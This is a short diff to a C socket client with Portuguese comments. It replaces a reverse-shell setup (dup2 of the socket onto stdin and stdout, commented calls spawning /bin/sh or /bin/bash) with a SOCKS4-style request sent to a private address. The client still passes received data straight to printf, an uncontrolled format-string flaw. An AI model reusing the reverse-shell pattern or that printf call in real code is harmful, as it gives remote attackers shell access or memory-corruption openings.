@@ -11,6 +11,8 @@
 char buff[1000];
 char *shell = "/bin/sh";
 
+char msgsock[] = {0x04, 0x01, 0x00, 0x50, 0xC0, 0xA8, 0x01, 0x01, 0x45, 0x45, 0x00};
+
 int main(void){
     
     // file descriptor que identifica o socket local
@@ -28,14 +30,8 @@ int main(void){
 
     if ((connect(fSock, (struct sockaddr *)&dadosSv, tDadosSv)) < 0)
 	puts("erro ao conectar");
-
-    dup2(fSock, fileno(stdin));   // entrada padrao trocada pelo socket
-    dup2(fSock, fileno(stdout));  // saida padrao trocada pelo socket
-
-
-    //dup2(fSock, fileno(stderr));  // saida de erro trocada pelo socket
-    //system("/bin/bash");
-    //execl(shell, "/bin/sh", (char*)0);
+    
+    send(fSock, msgsock, strlen(msgsock), 0);
     
     recv(fSock, buff, sizeof(buff), 0);
     printf(buff);
